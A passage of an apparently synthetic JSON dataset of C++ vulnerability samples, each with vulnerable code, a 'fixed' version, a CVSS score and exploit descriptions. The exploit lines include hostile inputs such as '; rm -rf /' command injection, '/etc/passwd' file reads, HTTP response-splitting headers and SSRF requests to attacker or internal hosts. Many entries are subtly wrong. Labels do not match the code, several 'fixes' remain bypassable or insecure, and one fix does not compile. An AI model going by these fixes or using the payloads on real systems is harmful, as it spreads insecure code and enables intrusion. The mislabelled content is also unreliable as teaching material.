            "By carefully timing thread execution, an attacker might force specific interleavings that lead to incorrect calculations or data corruption.",
            "If this pattern is used in a larger application managing critical resources, it could lead to unpredictable system behavior and potential security vulnerabilities."
        ]
    },
    "c++_26": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "void handleLogin(const std::string& username, const std::string& password) {\n    if (authenticate(username, password)) {\n        char sessionCookie[128];\n        generateSessionId(sessionCookie);\n        setcookie(\"sessionid\", sessionCookie, 3600);\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "void handleLogin(const std::string& username, const std::string& password) {\n    if (authenticate(username, password)) {\n        char sessionCookie[128];\n        generateSecureSessionId(sessionCookie);\n        setcookie(\"sessionid\", sessionCookie, 3600, \"/\", \"example.com\", true, true);\n    }\n}",
        "exploit_ways": [
            "An attacker can fixate a session ID and trick the victim into using it, gaining unauthorized access.",
            "By predicting or guessing session IDs, an attacker may hijack legitimate sessions if not properly secured.",
            "Session fixation can be combined with XSS to steal user sessions by injecting malicious scripts that set fixed session cookies."
        ]
    },
    "c++_27": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter your name: \";\\n    std::getline(std::cin, userInput);\\n    std::cout << \"Hello, \" << userInput << \"!\\n\";\\n    return 0;\\n}",
        "cvss_score": 4.2,
        "fixed_code": "#include <iostream>\\n#include <string>\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter your name: \";\\n    std::getline(std::cin, userInput);\\n    // Implement input validation and sanitization here\\n    if (userInput.find('<') != std::string::npos || userInput.find('>') != std::string::npos) {\\n        std::cout << \"Invalid input!\";\\n        return 1;\\n    }\\n    std::cout << \"Hello, \" << userInput << \"!\\n\";\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can inject HTML or JavaScript through the input to perform XSS attacks if this output is rendered in a web context.",
            "If the user input is not properly sanitized and logged, it could lead to log injection vulnerabilities.",
            "In certain contexts where the output is used in command-line operations, improperly sanitized inputs could lead to command injection."
        ]
    },
    "c++_28": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\n\\nvoid redirectUser(const std::string& url) {\\n    std::string command = \"xdg-open \\\"\" + url + \"\\\"\";\\n    system(command.c_str());\\n}\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter URL to visit: \";\\n    std::getline(std::cin, userInput);\\n    redirectUser(userInput);\\n    return 0;\\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\n\\nvoid redirectUser(const std::string& url) {\\n    const std::string allowedDomain = \"example.com\";\\n    if (url.find(allowedDomain) != std::string::npos) {\\n        std::string command = \"xdg-open \\\"\" + url + \"\\\"\";\\n        system(command.c_str());\\n    } else {\\n        std::cout << \"URL not allowed.\" << std::endl;\\n    }\\n}\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter URL to visit: \";\\n    std::getline(std::cin, userInput);\\n    redirectUser(userInput);\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker could input a malicious URL like 'http://malicious.com' to redirect the user.",
            "They can inject additional commands using special characters like '; rm -rf /'.",
            "Crafting URLs that lead to phishing sites or malware downloads."
        ]
    },
    "c++_29": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "#include <iostream>\\nclass Button {\\npublic:\\n    void onClick() {\\n        std::cout << \"Button clicked!\" << std::endl;\\n    }\\n};\\nint main() {\\n    Button b;\\n    b.onClick(); // Simulated click event\\n}",
        "cvss_score": 2.1,
        "fixed_code": "#include <iostream>\\nclass Button {\\npublic:\\n    void onClick(bool isUserAction) {\\n        if (isUserAction) {\\n            std::cout << \"Button clicked!\" << std::endl;\\n        } else {\\n            std::cout << \"Invalid click event.\" << std::endl;\\n        }\\n    }\\n};\\nint main() {\\n    Button b;\\n    bool userAction = true; // This should be determined by actual user interaction\\n    b.onClick(userAction);\\n}",
        "exploit_ways": [
            "An attacker could simulate a click event programmatically to trigger actions without the user's intent.",
            "By manipulating the application state, an attacker might force the button to execute its action in unintended contexts.",
            "If integrated into a larger system, an attacker could exploit this vulnerability to perform unauthorized operations by faking user interactions."
        ]
    },
    "c++_30": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\nusing namespace std;\\n\\nint main() {\\n    string userInput;\\n    cout << \"Enter your name: \";\\n    getline(cin, userInput);\\n    cout << \"Hello, \" << userInput << \"! Welcome to our website.\\n\";\\n    return 0;\\n}",
        "cvss_score": 5.3,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <algorithm>\\nusing namespace std;\\n\\nint main() {\\n    string userInput;\\n    cout << \"Enter your name: \";\\n    getline(cin, userInput);\\n    // Remove any linebreaks from the input to prevent HTTP response splitting\\n    userInput.erase(remove(userInput.begin(), userInput.end(), '\\n'), userInput.end());\\n    userInput.erase(remove(userInput.begin(), userInput.end(), '\\r'), userInput.end());\\n    cout << \"Hello, \" << userInput << \"! Welcome to our website.\\n\";\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker could input 'John\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<h1>Hacked</h1>' to inject additional HTTP headers.",
            "They could use '\\nSet-Cookie: EvilCookie=Hacked' to manipulate cookies sent to the client.",
            "An attacker might send '\\r\\nLocation: http://malicious.com' to redirect users to a malicious site."
        ]
    },
    "c++_31": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "#include <iostream>\n#include <string>\n#include <cstdlib>\n\nint main(int argc, char* argv[]) {\n    std::string url;\n    if (argc > 1) {\n        url = argv[1];\n        for (size_t i = 0; i < url.length(); ++i) {\n            if (url[i] == '&') {\n                std::string param = url.substr(i + 1);\n                if (param.find(\"redirect=\") == 0) {\n                    url = param.substr(9);\n                    break;\n                }\n            }\n        }\n    }\n    std::system((\"xdg-open \" + url).c_str());\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\n#include <string>\n#include <cstdlib>\n\nbool is_safe_url(const std::string& url) {\n    const std::string allowed_prefix = \"https://example.com/\";\n    return url.find(allowed_prefix) == 0;\n}\n\nint main(int argc, char* argv[]) {\n    std::string url;\n    if (argc > 1) {\n        url = argv[1];\n        for (size_t i = 0; i < url.length(); ++i) {\n            if (url[i] == '&') {\n                std::string param = url.substr(i + 1);\n                if (param.find(\"redirect=\") == 0) {\n                    url = param.substr(9);\n                    break;\n                }\n            }\n        }\n    }\n    if (is_safe_url(url)) {\n        std::system((\"xdg-open \" + url).c_str());\n    } else {\n        std::cerr << \"Unsafe URL\" << std::endl;\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL like 'http://malicious.com' to redirect users.",
            "Using crafted parameters, e.g., '?redirect=http://phishingsite.com', can lead to phishing attacks.",
            "A URL with additional commands or flags could be used to execute unintended actions on the user's system."
        ]
    },
    "c++_32": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "#include <iostream>\n#include <thread>\nclass Counter {\npublic:\n    int count;\n    void increment() {\n        for (int i = 0; i < 1000; ++i) {\n            count++;\n        }\n    }\n};\nint main() {\n    Counter c;\n    std::thread t1(&Counter::increment, &c);\n    std::thread t2(&Counter::increment, &c);\n    t1.join();\n    t2.join();\n    std::cout << \"Count: \" << c.count << std::endl;\n    return 0;\n}",
        "cvss_score": 5.3,
        "fixed_code": "#include <iostream>\n#include <thread>\n#include <mutex>\nclass Counter {\npublic:\n    int count;\n    std::mutex mtx;\n    void increment() {\n        for (int i = 0; i < 1000; ++i) {\n            std::lock_guard<std::mutex> lock(mtx);\n            count++;\n        }\n    }\n};\nint main() {\n    Counter c;\n    std::thread t1(&Counter::increment, &c);\n    std::thread t2(&Counter::increment, &c);\n    t1.join();\n    t2.join();\n    std::cout << \"Count: \" << c.count << std::endl;\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could run the program multiple times to observe inconsistent count values due to race conditions.",
            "By introducing additional threads, an attacker might exacerbate the issue and cause the program to crash or behave unpredictably.",
            "Race conditions can lead to a denial of service by causing the system to hang or consume excessive resources."
        ]
    },
    "c++_33": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n#include <unordered_map>\\n\\nstd::unordered_map<std::string, std::string> sessions;\\n\\nvoid login(const std::string& username) {\\n    static int session_counter = 0;\\n    std::string session_id = \"session_\" + std::to_string(session_counter++);\\n    sessions[session_id] = username;\\n    std::cout << \"Session ID: \" << session_id << std::endl;\\n}\\n\\nvoid access(const std::string& session_id) {\\n    if (sessions.find(session_id) != sessions.end()) {\\n        std::cout << \"Access granted for user: \" << sessions[session_id] << std::endl;\\n    } else {\\n        std::cout << \"Invalid session ID.\" << std::endl;\\n    }\\n}\\n\\nint main() {\\n    login(\"alice\");\\n    access(\"session_0\");\\n    return 0;\\n}",
        "cvss_score": 3.5,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <unordered_map>\\n#include <random>\\n#include <ctime>\\n\\nstd::unordered_map<std::string, std::string> sessions;\\n\\nvoid login(const std::string& username) {\\n    std::mt19937 rng(static_cast<unsigned int>(std::time(nullptr)));\\n    std::uniform_int_distribution<int> dist(0, 99999);\\n    std::string session_id = \"session_\" + std::to_string(dist(rng));\\n    sessions[session_id] = username;\\n    std::cout << \"Session ID: \" << session_id << std::endl;\\n}\\n\\nvoid access(const std::string& session_id) {\\n    if (sessions.find(session_id) != sessions.end()) {\\n        std::cout << \"Access granted for user: \" << sessions[session_id] << std::endl;\\n    } else {\\n        std::cout << \"Invalid session ID.\" << std::endl;\\n    }\\n}\\n\\nint main() {\\n    login(\"alice\");\\n    access(\"session_0\");\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can predict or guess session IDs by observing the pattern of incrementing integers.",
            "By fixing a session ID value, an attacker might be able to hijack a legitimate user's session if they guess correctly.",
            "Using fixed session IDs allows attackers to set their own session cookies that could match existing ones."
        ]
    },
    "c++_34": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "#include <iostream>\n#include <fstream>\n\nint main() {\n    std::ifstream file(\"secret.txt\");\n    if (file.is_open()) {\n        std::string line;\n        while (getline(file, line)) {\n            std::cout << line << '\\n';\n        }\n        file.close();\n    } else {\n        std::cerr << \"Unable to open file\" << '\\n';\n    }\n    return 0;\n}",
        "cvss_score": 2.5,
        "fixed_code": "#include <iostream>\n#include <fstream>\n\nint main() {\n    std::ifstream file(\"secret.txt\");\n    if (file.is_open()) {\n        std::string line;\n        while (getline(file, line)) {\n            // Process the line without outputting it to standard output\n        }\n        file.close();\n    } else {\n        std::cerr << \"Unable to open file\" << '\\n';\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker with access to the program can run it to view sensitive information stored in secret.txt.",
            "If the file contains configuration details, an attacker could use this information to exploit other vulnerabilities.",
            "By guessing or knowing the filename, an attacker might extract additional files if similar code is used elsewhere."
        ]
    },
    "c++_35": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "#include <iostream>\n#include <fstream>\n#include <string>\n\nvoid readFile(const std::string& filename) {\n    std::ifstream file(filename);\n    if (file.is_open()) {\n        std::string line;\n        while (getline(file, line)) {\n            std::cout << line << std::endl;\n        }\n        file.close();\n    } else {\n        std::cerr << \"Unable to open file\" << std::endl;\n    }\n}",
        "cvss_score": 4.3,
        "fixed_code": "#include <iostream>\n#include <fstream>\n#include <string>\n\nvoid readFile(const std::string& filename) {\n    const std::string allowed_path = \"./documents/\";\n    std::ifstream file(allowed_path + filename);\n    if (file.is_open()) {\n        std::string line;\n        while (getline(file, line)) {\n            std::cout << line << std::endl;\n        }\n        file.close();\n    } else {\n        std::cerr << \"Unable to open file\" << std::endl;\n    }\n}",
        "exploit_ways": [
            "An attacker can input \"/etc/passwd\" to read system's user list.",
            "They could specify a log file like \"/var/log/auth.log\" to extract login attempts and credentials.",
            "Inputting \"../../../../secrets.txt\" might allow access to sensitive information if the path isn't properly restricted."
        ]
    },
    "c++_36": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "#include <string>\\n#include <map>\\n\\nstd::map<std::string, std::string> sessions;\\n\\nbool authenticateUser(const std::string& username, const std::string& password) {\\n    if (username == \"admin\" && password == \"password123\") {\\n        std::string sessionID = generateSessionID(username);\\n        sessions[sessionID] = username;\\n        return true;\\n    }\\n    return false;\\n}\\n\\nstd::string generateSessionID(const std::string& username) {\\n    // Simulated session ID generation that is predictable or reusable.\\n    return \"fixedID\" + username.substr(0, 3);\\n}",
        "cvss_score": 4.2,
        "fixed_code": "#include <string>\\n#include <map>\\n#include <random>\\n#include <ctime>\\n\\nstd::map<std::string, std::string> sessions;\\nstd::mt19937 rng(static_cast<unsigned int>(std::time(nullptr)));\\n\\nbool authenticateUser(const std::string& username, const std::string& password) {\\n    if (username == \"admin\" && password == \"password123\") {\\n        std::string sessionID = generateSessionID();\\n        sessions[sessionID] = username;\\n        return true;\\n    }\\n    return false;\\n}\\n\\nstd::string generateSessionID() {\\n    // Generate a random and unpredictable session ID.\\n    std::uniform_int_distribution<> distr(0, 10000);\\n    return \"session_\" + std::to_string(distr(rng));\\n}",
        "exploit_ways": [
            "An attacker can predict the session ID using the username and hijack an admin's session.",
            "By knowing the predictable pattern, an attacker can create a session ID and force it on the user to take over their session.",
            "Session fixation could allow an attacker to lock into a specific session and maintain access across different login sessions."
        ]
    },
    "c++_37": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "#include <iostream>\n#include <string>\n\nvoid openRedirect(const std::string& url) {\n    std::cout << \"Redirecting to: \" << url << std::endl;\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <iostream>\n#include <string>\n\nbool isValidURL(const std::string& url) {\n    return (url.find(\"http://example.com\") == 0 || url.find(\"https://example.com\") == 0);\n}\n\nvoid openRedirect(const std::string& url) {\n    if (isValidURL(url)) {\n        std::cout << \"Redirecting to: \" << url << std::endl;\n    } else {\n        std::cout << \"Invalid URL\" << std::endl;\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL like 'http://malicious.com' to redirect users.",
            "Could use the openRedirect function to perform phishing attacks by redirecting to fake login pages.",
            "Potentially exploit redirects to deliver malware or spread viruses through URLs crafted to deceive users."
        ]
    },
    "c++_38": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "#include <iostream>\n#include <thread>\n#include <atomic>\n\nstd::atomic<int> counter(0);\n\nvoid increment() {\n    for (int i = 0; i < 100000; ++i) {\n        int local_counter = counter;\n        std::this_thread::sleep_for(std::chrono::nanoseconds(1));\n        counter = local_counter + 1;\n    }\n}\n\nint main() {\n    std::thread t1(increment);\n    std::thread t2(increment);\n\n    t1.join();\n    t2.join();\n\n    std::cout << \"Counter value: \" << counter << std::endl;\n    return 0;\n}",
        "cvss_score": 4.3,
        "fixed_code": "#include <iostream>\n#include <thread>\n#include <atomic>\n\nstd::atomic<int> counter(0);\n\nvoid increment() {\n    for (int i = 0; i < 100000; ++i) {\n        int local_counter;\n        do {\n            local_counter = counter.load();\n        } while (!counter.compare_exchange_weak(local_counter, local_counter + 1));\n    }\n}\n\nint main() {\n    std::thread t1(increment);\n    std::thread t2(increment);\n\n    t1.join();\n    t2.join();\n\n    std::cout << \"Counter value: \" << counter << std::endl;\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could cause the counter to have a lower final value than expected due to race conditions.",
            "If the counter is used for resource management, it might lead to undercounting and potential exhaustion of resources.",
            "In a larger system, such race conditions can lead to inconsistent states or crashes."
        ]
    },
    "c++_39": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "#include <iostream>\\n#include <thread>\\nclass SharedResource {\\nprivate:\\n    int data;\\npublic:\\n    SharedResource() : data(0) {}\\n\\n    void increment() {\\n        for (int i = 0; i < 1000; ++i) {\\n            int temp = data;\\n            std::this_thread::sleep_for(std::chrono::microseconds(1));\\n            data = temp + 1;\\n        }\\n    }\\n\\n    int getData() const { return data; }\\n};",
        "cvss_score": 4.3,
        "fixed_code": "#include <iostream>\\n#include <thread>\\n#include <mutex>\\nclass SharedResource {\\nprivate:\\n    int data;\\n    std::mutex mtx;\\npublic:\\n    SharedResource() : data(0) {}\\n\\n    void increment() {\\n        for (int i = 0; i < 1000; ++i) {\\n            std::lock_guard<std::mutex> lock(mtx);\\n            int temp = data;\\n            data = temp + 1;\\n        }\\n    }\\n\\n    int getData() const { return data; }\\n};",
        "exploit_ways": [
            "An attacker could run multiple threads to cause a race condition, leading to incorrect data values.",
            "By carefully timing the execution of threads, an attacker might manipulate the shared resource's state unexpectedly.",
            "The race condition can lead to inconsistent or corrupted data, affecting the integrity and reliability of the application."
        ]
    },
    "c++_40": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "#include <iostream>\n#include <string>\n\nvoid loadWebsite(const std::string& url) {\n    // Simulate loading a website in an iframe\n    cout << \"Loading website: \" << url << endl;\n}\n\nint main() {\n    std::string userInput;\n    std::cout << \"Enter the URL to load: \";\n    std::getline(std::cin, userInput);\n    // Vulnerable due to lack of proper input validation and security checks\n    loadWebsite(userInput);\n    return 0;\n}",
        "cvss_score": 4.2,
        "fixed_code": "#include <iostream>\n#include <string>\n#include <regex>\n\nbool isValidURL(const std::string& url) {\n    const std::regex pattern(R\"((http|https):\\/\\/(www\\.)?[a-zA-Z0-9@:%._\\+~#?&//=]{2,256}\\.[a-z]{2,6})\");\n    return std::regex_match(url, pattern);\n}\n\nvoid loadWebsite(const std::string& url) {\n    // Simulate loading a website in an iframe\n    cout << \"Loading website: \" << url << endl;\n}\n\nint main() {\n    std::string userInput;\n    std::cout << \"Enter the URL to load: \";\n    std::getline(std::cin, userInput);\n    if (isValidURL(userInput)) {\n        loadWebsite(userInput);\n    } else {\n        cout << \"Invalid URL\" << endl;\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can input a malicious URL that redirects to a phishing site.",
            "Could provide a URL that leads to an exploit kit aiming to download malware.",
            "User could be redirected to a site that performs unwanted actions like logging keystrokes."
        ]
    },
    "c++_41": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "#include <iostream>\n#include <string>\n\nvoid displayOverlay() {\n    std::string html = \"<iframe src=\\\"https://malicious-site.com/overlay\\\"></iframe>\";\n    std::cout << html << std::endl;\n}",
        "cvss_score": 3.0,
        "fixed_code": "#include <iostream>\n#include <string>\n\nvoid displayOverlay() {\n    std::string html = \"<iframe src=\\\"https://malicious-site.com/overlay\\\" sandbox=\\\"allow-scripts allow-same-origin\\\"></iframe>\";\n    std::cout << html << std::endl;\n}",
        "exploit_ways": [
            "An attacker can overlay a transparent malicious iframe on top of the legitimate page to trick users into clicking.",
            "The user's clicks inside the iframe could be used to perform unauthorized actions on the malicious site.",
            "Attackers can host phishing content in the iframe to gather sensitive information from unsuspecting users."
        ]
    },
    "c++_42": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n#include <curl/curl.h>\\n\\nvoid fetchUrl(const std::string& url) {\\n    CURL* curl;\\n    CURLcode res;\\n    curl = curl_easy_init();\\n    if(curl) {\\n        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\\n        res = curl_easy_perform(curl);\\n        curl_easy_cleanup(curl);\\n    }\\n}\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter URL: \";\\n    std::cin >> userInput;\\n    fetchUrl(userInput);\\n    return 0;\\n}",
        "cvss_score": 5.3,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <curl/curl.h>\\n\\nvoid fetchUrl(const std::string& url) {\\n    CURL* curl;\\n    CURLcode res;\\n    const std::string allowedHost = \"example.com\";\\n    if (url.find(allowedHost) != std::string::npos) {\\n        curl = curl_easy_init();\\n        if(curl) {\\n            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\\n            res = curl_easy_perform(curl);\\n            curl_easy_cleanup(curl);\\n        }\\n    } else {\\n        std::cerr << \"Access denied to URL: \" << url << std::endl;\\n    }\\n}\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter URL: \";\\n    std::cin >> userInput;\\n    fetchUrl(userInput);\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can input 'http://internal.example.com/secrets' to access internal resources.",
            "They can try 'file:///etc/passwd' to read local files on the server.",
            "Attacker might use a crafted URL to perform port scanning within the same network."
        ]
    },
    "c++_43": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n\\nusing namespace std;\\nclass WebRedirect {\\npublic:\\n    void redirect(string url) {\\n        cout << \"Redirecting to: \" << url << endl;\\n    }\\n};",
        "cvss_score": 5.0,
        "fixed_code": "#include <iostream>\\n#include <string>\\nusing namespace std;\\nclass WebRedirect {\\npublic:\\n    void redirect(string url) {\\n        const string allowedDomain = \"example.com\";\\n        if (url.find(allowedDomain) != string::npos) {\\n            cout << \"Redirecting to: \" << url << endl;\\n        } else {\\n            cout << \"Invalid redirection URL.\" << endl;\\n        }\\n    }\\n};",
        "exploit_ways": [
            "An attacker could provide a malicious URL like 'http://malicious.com' to redirect users away from the intended site.",
            "By using URL parameters, an attacker can attempt to inject additional URLs that lead to phishing or malware sites.",
            "Crafting long URLs with multiple redirects might trick the application into forwarding users through several malicious sites before reaching a legitimate one."
        ]
    },
    "c++_44": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "#include <iostream>\\n#include <thread>\\nusing namespace std;\\nvoid createThreads() {\\n    while (true) {\\n        thread([]() {}).detach();\\n    }\\n}\\nint main() {\\n    createThreads();\\n    return 0;\\n}",
        "cvss_score": 4.2,
        "fixed_code": "#include <iostream>\\n#include <thread>\\nusing namespace std;\\nvoid createLimitedThreads(int max_threads) {\\n    for (int i = 0; i < max_threads; ++i) {\\n        thread([]() {}).detach();\\n    }\\n}\\nint main() {\\n    int max_threads = 100;\\n    createLimitedThreads(max_threads);\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can run the program to exhaust system resources, causing a denial of service.",
            "By deploying multiple instances of this application, an attacker can overwhelm server resources.",
            "This vulnerability can be used in conjunction with other attacks to degrade system performance."
        ]
    },
    "c++_45": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "class WebServer {\npublic:\n    void sendResponse(const std::string& content) {\n        std::cout << \"HTTP/1.1 200 OK\\r\\n\";\n        std::cout << \"Content-Length: \" << content.length() << \"\\r\\n\";\n        std::cout << \"\\r\\n\";\n        std::cout << content;\n    }\n};",
        "cvss_score": 5.3,
        "fixed_code": "class WebServer {\npublic:\n    void sendResponse(const std::string& content) {\n        std::cout << \"HTTP/1.1 200 OK\\r\\n\";\n        std::cout << \"Content-Length: \" << content.length() << \"\\r\\n\";\n        std::cout << \"X-XSS-Protection: 1; mode=block\\r\\n\";\n        std::cout << \"X-Content-Type-Options: nosniff\\r\\n\";\n        std::cout << \"Strict-Transport-Security: max-age=31536000; includeSubDomains\\r\\n\";\n        std::cout << \"Content-Security-Policy: default-src 'self'\\r\\n\";\n        std::cout << \"\\r\\n\";\n        std::cout << content;\n    }\n};",
        "exploit_ways": [
            "An attacker could inject malicious scripts into responses, leading to Cross-Site Scripting (XSS) attacks.",
            "Without Content Security Policy headers, attackers might load untrusted external resources that can exploit vulnerabilities in browsers or the application.",
            "Lack of X-Content-Type-Options header allows MIME-type sniffing, potentially enabling attackers to execute scripts uploaded as image files."
        ]
    },
    "c++_46": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "#include <iostream>\\n#include <fstream>\\n\\nvoid readSensitiveData() {\\n    std::ifstream file(\"sensitive_data.txt\");\\n    std::string line;\\n    while (getline(file, line)) {\\n        std::cout << line << std::endl;\\n    }\\n    file.close();\\n}",
        "cvss_score": 3.5,
        "fixed_code": "#include <iostream>\\n#include <fstream>\\n\\nvoid readSensitiveData() {\\n    std::ifstream file(\"sensitive_data.txt\");\\n    if (!file.is_open()) {\\n        std::cerr << \"Failed to open the file.\" << std::endl;\\n        return;\\n    }\\n    std::string line;\\n    while (getline(file, line)) {\\n        // Process data securely or restrict access\\n        std::cout << \"[REDACTED]\\\" << std::endl;\\n    }\\n    file.close();\\n}",
        "exploit_ways": [
            "An attacker with access to the application could view sensitive information printed to the console.",
            "If the application runs as a privileged user, an attacker could use this to gather system-level data.",
            "The presence of sensitive data in console output can be logged or captured by other processes on the same system."
        ]
    },
    "c++_47": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "#include <iostream>\\n\\nint main() {\\n    std::cout << \"Click the button to proceed...\" << std::endl;\\n    // Simulating a clickjacking scenario where the user clicks on an invisible malicious overlay\\n    std::string userInput;\\n    std::cin >> userInput;\\n    if (userInput == \"click\") {\\n        std::cout << \"You have been redirected to a malicious site.\" << std::endl;\\n    }\\n    return 0;\\n}",
        "cvss_score": 4.2,
        "fixed_code": "#include <iostream>\\n#include <string>\\nusing namespace std;\\n\\nint main() {\\n    cout << \"Click the button to proceed...\" << endl;\\n    string userInput;\\n    cin >> userInput;\\n    if (userInput == \"click\") {\\n        // Implement proper authentication or verification before proceeding\\n        cout << \"Proceeding with authenticated click.\" << endl;\\n    } else {\\n        cout << \"Invalid input.\" << endl;\\n    }\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can create a malicious overlay that trick users into clicking on it, thinking they are interacting with a legitimate element.",
            "The attacker could use this to redirect users to a phishing site by prompting them to \"click\" without their knowledge.",
            "By manipulating the input in certain scenarios, an attacker might exploit related vulnerabilities if the application is not fully secured against other attack vectors."
        ]
    },
    "c++_48": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "#include <iostream>\n#include <curl/curl.h>\n\nvoid fetchUrl(const std::string& url) {\n    CURL* curl = curl_easy_init();\n    if(curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\n        curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n    }\n}\n\nint main() {\n    std::string userInput;\n    std::cout << \"Enter URL to fetch: \";\n    std::cin >> userInput;\n    fetchUrl(userInput);\n    return 0;\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <iostream>\n#include <curl/curl.h>\n\nbool isAllowed(const std::string& url) {\n    const std::string allowedDomain = \"example.com\";\n    return url.find(allowedDomain) != std::string::npos;\n}\n\nvoid fetchUrl(const std::string& url) {\n    if (!isAllowed(url)) {\n        std::cerr << \"URL not allowed.\" << std::endl;\n        return;\n    }\n    CURL* curl = curl_easy_init();\n    if(curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\n        curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n    }\n}\n\nint main() {\n    std::string userInput;\n    std::cout << \"Enter URL to fetch: \";\n    std::cin >> userInput;\n    fetchUrl(userInput);\n    return 0;\n}",
        "exploit_ways": [
            "User could input 'http://attacker.com' to initiate requests to an attacker-controlled server.",
            "By entering 'file:///etc/passwd', they can read local files on the server.",
            "Using a URL like 'http://localhost:8080/admin' might allow access to internal services not exposed externally."
        ]
    },
    "c++_49": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter your name: \";\\n    std::getline(std::cin, userInput);\\n    std::cout << \"Hello, \" + userInput + \"!\" << std::endl;\\n    return 0;\\n}",
        "cvss_score": 4.3,
        "fixed_code": "#include <iostream>\\n#include <string>\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter your name: \";\\n    std::getline(std::cin, userInput);\\n    // Sanitize user input to prevent injection attacks\\n    if (userInput.find(';') != std::string::npos || userInput.find('|') != std::string::npos) {\\n        std::cout << \"Invalid characters detected.\" << std::endl;\\n        return 1;\\n    }\\n    std::cout << \"Hello, \" + userInput + \"!\" << std::endl;\\n    return 0;\\n}",
        "exploit_ways": [
            "User could input malicious strings to exploit potential vulnerabilities in handling user input.",
            "Injection of special characters like ';' or '|' could lead to unexpected behavior if the codebase is expanded later.",
            "If the program is part of a larger system, an attacker might attempt to use the unsanitized input to execute additional commands."
        ]
    }
}